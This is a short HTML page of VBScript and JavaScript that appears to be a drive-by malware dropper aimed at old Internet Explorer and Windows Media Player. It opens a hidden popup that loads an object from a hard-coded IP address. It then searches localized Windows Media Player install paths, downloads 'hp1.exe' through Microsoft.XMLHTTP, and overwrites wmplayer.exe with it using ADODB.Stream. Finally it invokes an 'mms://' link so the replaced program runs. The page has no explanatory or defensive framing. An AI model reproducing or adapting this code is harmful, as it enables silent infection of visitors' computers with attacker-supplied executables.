<script language="vbscript">
    Function Exists(filename)
        On Error Resume Next
        LoadPicture(filename)
        Exists = Err.Number =  481
    End Function    
</script>

<script language="javascript">

var oPopup = window.createPopup();
function showPopup()
{
	oPopup.document.body.innerHTML = "<object data=http://209.50.251.182/vu083003/object-c002.cgi>";
	oPopup.show(0,0,1,1,document.body);
}
showPopup()

    wmplayerpaths= [
            "C:\\Programmer\\Windows Media Player\\wmplayer.exe",
            "C:\\Program\\Windows Media Player\\wmplayer.exe",
            "C:\\Programme\\Windows Media Player\\wmplayer.exe",
            "C:\\Programmi\\Windows Media Player\\wmplayer.exe",
            "C:\\Programfiler\\Windows Media Player\\wmplayer.exe",
            "C:\\Programas\\Windows Media Player\\wmplayer.exe",
            "C:\\Archivos de programa\\Windows Media Player\\wmplayer.exe",
            "C:\\Program Files\\Windows Media Player\\wmplayer.exe"
           ];
    
    for (i=0;i<wmplayerpaths.length;i++) {
        wmplayerpath = wmplayerpaths[i];
        if (Exists(wmplayerpath))
            break;
    }

    function getPath(url) {
        start = url.indexOf('http:')
        end = url.indexOf('HP1.CHM')
        return url.substring(start, end);
    }
    
    payloadURL = getPath(location.href)+'hp1.exe';
    
    var x = new ActiveXObject("Microsoft.XMLHTTP"); 
    x.Open("GET",payloadURL,0); 
    x.Send(); 
    
    var s = new ActiveXObject("ADODB.Stream");
    s.Mode = 3;
    s.Type = 1;
    s.Open();
    s.Write(x.responseBody);

    s.SaveToFile(wmplayerpath,2);

var win=null;
function NewWindow(mypage,myname,w,h,scroll,pos){
if(pos=="random"){LeftPosition=(screen.width)?Math.floor(Math.random()*(screen.width-w)):100;TopPosition=(screen.height)?Math.floor(Math.random()*((screen.height-h)-75)):100;}
if(pos=="center"){LeftPosition=(screen.width)?(screen.width-w)/2:100;TopPosition=(screen.height)?(screen.height-h)/2:100;}
else if((pos!="center" && pos!="random") || pos==null){LeftPosition=0;TopPosition=20}
settings='width='+w+',height='+h+',top='+TopPosition+',left='+LeftPosition+',scrollbars='+scroll+',location=no,directories=no,status=no,menubar=no,toolbar=no,resizable=no';
win=window.open(mypage,myname,settings);}

//NewWindow("http://209.50.252.95/si2/presi2.htm?from-si",'presi2','100','100','yes','center');

//self.focus();
    
    location.href = "mms://";

</script>    